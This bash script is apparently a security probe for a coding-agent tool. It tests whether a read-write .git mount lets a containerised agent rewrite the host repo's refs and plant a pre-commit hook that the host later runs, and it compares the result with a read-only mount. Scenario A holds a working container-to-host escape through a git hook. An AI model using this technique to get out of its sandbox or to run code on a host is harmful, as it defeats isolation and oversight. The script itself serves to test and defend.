#!/usr/bin/env bash
# FG-559 PROBE 3 — THE SECURITY BOUNDARY.
#
# If the FG-559 fix mounts the parent repo's .git into the container, what is the
# WRITE EXPOSURE?  A red gets `-v <project>:/project:ro`. A blue gets rw. The
# question the ticket demands be answered with EVIDENCE, not assumption:
#
#   Can a BLUE agent, from inside a container that was supposed to be isolated to
#   its own worktree, MUTATE THE HOST REPO — its refs, its objects, its HEAD —
#   and worse, achieve HOST CODE EXECUTION?
#
# The host-code-execution vector is specific and load-bearing, because forge
# itself runs git ON THE HOST against this repo:
#   src/v2/worktree-lifecycle.ts:274-279  execFileSync("git", ["add","."])  and
#                                          ["commit", ...]   cwd = worktreePath
#   src/v2/worktree-lifecycle.ts:290      execFileSync("git", ["merge","--ff-only"]) cwd = projectDir
# git hooks live in the COMMON dir (.git/hooks), which is SHARED by every linked
# worktree. So anything that can write .git/hooks/ can plant a script that the
# HOST executes, as the host user, during forge's own merge-back.
#
# Harness note: same path-visibility model as P1. The "container" here is a
# process with write access to the mounted paths — which is exactly the authority
# a `-v <path>:<path>:rw` bind mount confers. Bind mounts do not sandbox writes;
# they pass them through to the host inode. (P5 confirms this on a real docker
# host; the authority model being tested here is git's, not Docker's.)
#
# Run: bash p3-write-exposure.sh
set -u

R=/tmp/fg559-p3
rm -rf "$R"; mkdir -p "$R"
REPO="$R/host/code/proj"
WT="$R/host/dotforge/worktrees/run1/task1"
LOOT="$R/LOOT"          # stands for "attacker achieved host code execution"

mkdir -p "$REPO"
git -C "$REPO" init -q -b main
git -C "$REPO" config user.email f@l; git -C "$REPO" config user.name forge
printf 'v1\n' > "$REPO/a.txt"; git -C "$REPO" add -A; git -C "$REPO" commit -qm c1
MAIN_BEFORE=$(git -C "$REPO" rev-parse main)
mkdir -p "$(dirname "$WT")"
git -C "$REPO" worktree add -q "$WT" -b forge/run1/task1

echo "=== SETUP ==="
echo "  host repo main = $MAIN_BEFORE"
echo "  worktree       = $WT  (branch forge/run1/task1)"
echo "  the container's /project is the worktree; the fix also mounts $REPO/.git"
echo

# ============================================================================
# SCENARIO A — BLUE agent, parent .git mounted READ-WRITE
# Everything below runs with ONLY the authority a rw bind mount of .git confers.
# ============================================================================
echo "############ SCENARIO A: parent .git mounted RW (the BLUE shape) ############"
echo
echo "--- A1. Can the container REWRITE THE HOST REPO'S BRANCH REFS?"
printf 'pwned\n' > "$WT/a.txt"
git -C "$WT" add -A >/dev/null 2>&1
git -C "$WT" -c user.name=x -c user.email=x@x commit -qm "agent commit" >/dev/null 2>&1
EVIL=$(git -C "$WT" rev-parse HEAD)
if git -C "$WT" update-ref refs/heads/main "$EVIL" 2>/dev/null; then
  MAIN_AFTER=$(git -C "$REPO" rev-parse main)
  if [ "$MAIN_AFTER" != "$MAIN_BEFORE" ]; then
    echo "    *** YES — HOST REPO'S main WAS REWRITTEN FROM INSIDE THE CONTAINER ***"
    echo "        main: $MAIN_BEFORE  ->  $MAIN_AFTER"
  else
    echo "    no — main unchanged"
  fi
else
  echo "    no — update-ref refused"
fi
git -C "$REPO" update-ref refs/heads/main "$MAIN_BEFORE"   # restore for the next test

echo
echo "--- A2. Can the container write LOOSE OBJECTS into the host object store?"
BLOB=$(printf 'attacker-controlled content\n' | git -C "$WT" hash-object -w --stdin 2>/dev/null)
if [ -n "${BLOB:-}" ] && git -C "$REPO" cat-file -e "$BLOB" 2>/dev/null; then
  echo "    *** YES — object $BLOB is now in the HOST's .git/objects ***"
else
  echo "    no — object write refused"
fi

echo
echo "--- A3. HOST CODE EXECUTION: plant a hook in the SHARED .git/hooks,"
echo "        then let FORGE'S OWN HOST-SIDE MERGE-BACK run it."
mkdir -p "$REPO/.git/hooks"
cat > "$REPO/.git/hooks/pre-commit" <<EOF
#!/bin/sh
# planted from inside the container via the rw .git mount
echo "HOST CODE EXECUTION as \$(id -un) at \$(pwd)" > "$LOOT"
EOF
chmod +x "$REPO/.git/hooks/pre-commit"
echo "        planted: $REPO/.git/hooks/pre-commit"
echo
echo "        >>> now the HOST runs forge's real merge-back sequence"
echo "            (worktree-lifecycle.ts mergeWorktreeBranch: git add . ; git commit ; git merge --ff-only)"
printf 'more agent work\n' >> "$WT/a.txt"      # make the tree dirty so auto-commit fires
git -C "$WT" add . >/dev/null 2>&1
git -C "$WT" -c user.name=forge -c user.email=forge@local \
    commit -m "forge: auto-commit task task1 output" >/dev/null 2>&1
if [ -f "$LOOT" ]; then
  echo
  echo "    *** YES — THE HOST EXECUTED THE CONTAINER'S CODE ***"
  echo "        loot file written by the hook, on the host:"
  sed 's/^/          /' "$LOOT"
  echo "        => a rw .git mount is a CONTAINER -> HOST ESCAPE, triggered by"
  echo "           forge's own merge-back. No agent misbehaviour needed beyond"
  echo "           writing one file into the mounted .git."
else
  echo "    no — hook did not run"
fi

# ============================================================================
# SCENARIO B — the same attacks with parent .git mounted READ-ONLY
# ============================================================================
echo
echo "############ SCENARIO B: parent .git mounted READ-ONLY ############"
rm -f "$LOOT" "$REPO/.git/hooks/pre-commit"
git -C "$REPO" update-ref refs/heads/main "$MAIN_BEFORE"
chmod -R a-w "$REPO/.git"

echo
echo "--- B1. rewrite host refs?"
if git -C "$WT" update-ref refs/heads/main "$EVIL" 2>/dev/null; then
  echo "    *** YES (unexpected) ***"
else
  echo "    NO — refused (read-only .git)"
fi

echo
echo "--- B2. write objects into the host store?"
if printf 'x\n' | git -C "$WT" hash-object -w --stdin >/dev/null 2>&1; then
  echo "    *** YES (unexpected) ***"
else
  echo "    NO — refused (read-only .git)"
fi

echo
echo "--- B3. plant a hook?"
if cat > "$REPO/.git/hooks/pre-commit" 2>/dev/null <<'EOF'
#!/bin/sh
echo pwned
EOF
then
  echo "    *** YES (unexpected) ***"
else
  echo "    NO — refused (read-only .git)"
fi

echo
echo "--- B4. do the READ commands the agents actually need still work? (see P1 SET5)"
for cmd in "log --oneline -2" "show --stat HEAD" "blame a.txt"; do
  # shellcheck disable=SC2086
  if git -C "$WT" $cmd >/dev/null 2>&1; then echo "    git $(echo $cmd | cut -d' ' -f1) -> OK"
  else echo "    git $(echo $cmd | cut -d' ' -f1) -> FAIL"; fi
done

echo
echo "--- B5. can the agent still COMMIT inside the container? (the contract question)"
printf 'z\n' >> "$WT/a.txt"
if git -C "$WT" -c user.name=a -c user.email=a@a commit -aqm "in-container commit" 2>/dev/null; then
  echo "    YES — in-container commit succeeded"
else
  echo "    NO — in-container commit FAILS under a read-only .git."
  echo "         (worktree-lifecycle.ts's HOST-SIDE auto-commit still captures the work:"
  echo "          mergeWorktreeBranch git add . + git commit, run on the host — :270-287)"
fi

chmod -R u+w "$REPO/.git"
echo
echo "=== done ==="
